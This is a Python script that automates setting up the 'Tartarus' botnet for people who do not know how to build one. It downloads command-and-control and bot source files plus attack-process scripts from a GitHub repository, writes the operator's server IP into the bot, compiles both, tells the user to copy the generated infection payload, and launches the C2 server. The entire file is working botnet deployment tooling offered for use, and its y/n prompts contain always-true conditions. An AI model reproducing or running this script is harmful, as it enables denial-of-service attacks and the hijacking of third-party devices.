# Setup by :)
import subprocess, time

def Tartarus(cmd):
    subprocess.call(cmd, shell=True)
def Vex(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

# If you don't know how to set up a botnet, this is for you. :)
#///////////////////////
# Colors and such
dred = "\x1b[0;31m"
dblue = "\x1b[0;34m"
dcyan = "\x1b[0;36m"
red = "\x1b[1;31m"
blue = "\x1b[1;34m"
cyan = "\x1b[1;36m"
white = "\x1b[1;37m"
#///////////////////////
# File Paths
IPHM = "scripts/"
#///////////////////////
print(""+ white +"Credits:")
time.sleep(1)
print(""+ white +"AutoSetup Developer: "+ red +"Vexvain"+ white +"/ "+ red +":)"+ cyan +"#RIPKatura")
time.sleep(1)
print(""+ white +"Tartarus  Developers: "+ cyan +"@"+ red +":)"+ white +"and "+ cyan +"@"+ red +"Vexvain")
time.sleep(1)
print(""+ white +"IPLookup Api: "+ red +"N/A")
time.sleep(1)
print(""+ white +"Domain Resolver: "+ red +"Snickers")
time.sleep(1)
print(""+ white +"Installing Needed "+ red +"Dependencies "+ white +"And "+ red +"Packages "+ white +"before setting up..")
time.sleep(3)
#///////////////////////
# Dependency Installation
#Tartarus("yum update -y")
#Tartarus("yum install python-paramiko gcc screen nano wget httpd iptables perl php php-pear -y")
#Tartarus("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y")
#Tartarus("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y")
#Tartarus("yum install epel-release -y")
#Tartarus("yum install gengetopt -y")
#Tartarus("yum install bzip2 -y")
#Tartarus("yum install lbzip2 -y")
#Tartarus("clear")
#///////////////////////
#print(""+ red +"Finished!")
#time.sleep(2)
#///////////////////////
# Server ULIMIT Setup
print("Setting Server ULIMIT and Downloading All files.")
Tartarus("ulimit -n 999999")
print(""+ red +"Finished!")
time.sleep(2)
Tartarus("clear")
#///////////////////////
print(""+ white +"I'm going to need a few things from you..")
time.sleep(2)
# User input (We are using this to replace said information inside of the Bot, C2Base)
username = raw_input(""+ white +"Enter Desired Username:"+ red +" ")
password = raw_input(""+ white +"Enter Desired Password:"+ red +" ")
print(""+ white +"Setting Up User: "+ red +"["+ white +""+ username +""+ red +"] "+ white +"With "+ cyan +"Administrator "+ white +"Account!")
Tartarus("echo "+ username +" "+ password +" admin >> arceus.txt")
IP = raw_input(""+ white +"Enter Your Servers IP:"+ red +" ")
threads = raw_input(""+ white +"Enter Desired Threads to screen on:"+ red +" ")
cport = raw_input(""+ white +"Enter your desired Connection Port:"+ red +" ")
#///////////////////////
print("Now, lets setup our directiories")
print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"logs"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"amp"+ white +"/"+ red +"]")
Tartarus("mkdir logs amp scripts")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"K, now lets download everything")
print(""+ white +"Downloading "+ red +"Tartarus Alpha..")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/c2.c -O c2.c")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Tartarus Bot")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Autosetup/bot.c -O bot.c")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Tartarus Cross-Compiler")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/Tartarus.py -O Tartarus.py")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Resolver Header")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/resolver.h -O resolver.h")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"IPHM Scanner Process Killer")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Scanner_Process_Killerv2.py -O IPHM_Scanner_Process_Killerv2.py")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"IPHM Attack process killer")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Attack_Process_Killerv2.py -O IPHM_Attack_Process_Killerv2.py")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"IPLookup API")
Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/iplookup.php -O iplookup.php")
time.sleep(2)
print(""+ red +"Finished!")
time.sleep(2)
Tartarus("clear")
print(""+ white +"Now lets replace the needed information inside of the "+ red +"Bot")
print(""+ white +"Replacing "+ red +"IP "+ white +"And "+ red +"BotPort inside of the Bot")
Vex('bot.c', 182, 'unsigned char *Tartarus[] = {"'+ IP +':666"}; // <ServerIP>:<BotPort>\n')
time.sleep(2)
print(""+ red +"Finished!")
time.sleep(2)
Tartarus("clear")
print(""+ white +"Now lets compile our C2 and BOT")
comp = raw_input("Would you like to remove the raw .c file for the c2 after compiling? (y/n):")

if comp == "y" or "Y":
    Tartarus("gcc -o c2 c2.c -pthread")
    Tartarus("rm -rf c2.c")
elif comp == "n" or "N":
    Tartarus("gcc -o c2 c2.c -pthread")

print(""+ white +"Finished Compiling "+ red +"C2, "+ white +"time to compile our "+ red +"bot"+ white +"!")
time.sleep(2)
Tartarus("python Tartarus.py bot.c "+ IP +"")
print("Make sure to copy your payload, im giving you 10 seconds "+ red +"<3")
time.sleep(10)
Tartarus("clear")
print(""+ white +"Now that our directories are setup and our bots compiled, lets go ahead and move our files")
print(""+ white +"Now lets move our needed files into the correct directories")
time.sleep(2)
print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Attack_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Scanner_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Moving Script: "+ red +"["+ white +"iplookup.php"+ red +"] "+ white +"To Directory: "+ red +"["+ white +"/"+ red +"var"+ white +"/"+ red +"www"+ white +"/"+ red +"html"+ white +"/"+ red +"]")
Tartarus("mv IPHM_Attack_Process_Killerv2.py "+ IPHM +"")
Tartarus("mv IPHM_Scanner_Process_Killerv2.py "+ IPHM +"")
Tartarus("mv iplookup.php /var/www/html/")
time.sleep(2)
print(""+ red +"Finished!")
cleanup = raw_input("Would you like to clean the server and get rid of all extra files? (y/n): ")

if cleanup == "y" or "Y":
    Tartarus("rm -rf Tartarus.py")
    Tartarus("mkdir Cross-Compilers")
    Tartarus("mv cross-compiler-* Cross-Compilers/")
    print(""+ red +"Continuing!")
elif cleanup == "n" or "N":
    print(""+ red +"Continuing!")

print(""+ white +"Now we're done! lets screen and connect.")
Tartarus("screen -dm ./c2 666 "+ threads +" "+ cport +"")
print(""+ white +"Its up! Information below!")
print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"] "+ white +"Connection Port: "+ red +"["+ white +""+ cport +""+ red +"] "+ white +"BotPort: "+ red +"["+ white +"666"+ red +"] "+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]")
